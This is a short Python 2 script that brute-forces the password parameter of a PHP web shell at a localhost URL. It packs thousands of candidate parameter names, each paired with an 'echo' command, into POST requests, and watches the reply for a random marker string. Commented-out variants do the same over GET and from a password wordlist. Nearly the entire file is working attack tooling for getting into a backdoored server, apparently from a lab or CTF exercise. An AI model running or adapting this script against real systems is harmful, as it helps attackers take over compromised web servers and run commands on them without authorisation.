#!/usr/bin/env python
# encoding:utf8

import requests
import random
import time
import linecache

startTime = time.time()

size = 100
filename = "password.txt"
passwordFile = open(filename,'rU').readlines()
url = "http://127.0.0.1/shell.php"

def getRandomString(randomlength=4):
    str = ""
    chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','0','1','2','3','4','5','6','7','8','9']
    for i in range(randomlength):
    	str += chars[(random.randint(0, len(chars) - 1))]
    return str

def addProIntoUrl(url,pro):
	return url + "&" + pro;

def checkTrueOrFalseByGET(url, keyword):
	return ((keyword) in (requests.get(url).text))

def checkTrueOrFalseByPOST(url, postData, keyword):
	print requests.post(url, data=postData).text
	return ((keyword) in (requests.post(url, data=postData).text))

# chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','0','1','2','3','4','5','6','7','8','9']
chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# for i in range(97,123):
# 	for j in range(97,123):
# 		for k in range(97,123):
# 			for l in range(97,123):
# 				tempurl = url
# 				randomString = getRandomString()
# 				print chr(i) + chr(j) + chr(k) + chr(l)
# 				for m in range(97,123):
# 					password = chr(i) + chr(j) + chr(k) + chr(l) + chr(m)
# 					tempurl += "&" + password + "=echo " + randomString + ";"
# 				print tempurl
# 				if checkTrueOrFalseByGET(tempurl, randomString):
# 					exit(1)


for i in range(97,123):
	for j in range(97,123):
		postData = {}
		randomString = getRandomString()
		print chr(i) + chr(j)
		for k in range(97,123):
			for l in range(97,123):
				for m in range(97,123):
					password = chr(i) + chr(j) + chr(k) + chr(l) + chr(m)
					postData[password] = "echo " + randomString + ";"
		if checkTrueOrFalseByPOST(url, postData, randomString):
			exit(1)


# passwordNumber = len(passwordFile)
# print "密码个数 : " , passwordNumber
# times = int(passwordNumber / size)
# print "需要爆破次数 : " , times

# for i in range(times):
# 	startIndex = i * size
# 	endIndex = (i + 1) * size
# 	print "Trying : [" , startIndex , "," , endIndex , "]"
# 	newlist = passwordFile[startIndex:endIndex]
# 	tempurl = url + "?lilac=0"
# 	randomString = getRandomString()
# 	for line in newlist:
# 		command = "echo '" + randomString + "';"
# 		password = line[0:-1]
# 		tempurl += "&" + password + "=" + command
# 		# print tempurl
# 	# print tempurl
# 	# Request the url
# 	print tempurl
# 	response = requests.get(tempurl)
# 	content = response.text
# 	print "-----------"
# 	print content
# 	print "-----------"
# 	if randomString in content:
# 		print "[" , startIndex , "," , endIndex , "]"
# 		break
# 	print "\n\n\n\n"

endTime = time.time()
print endTime - startTime
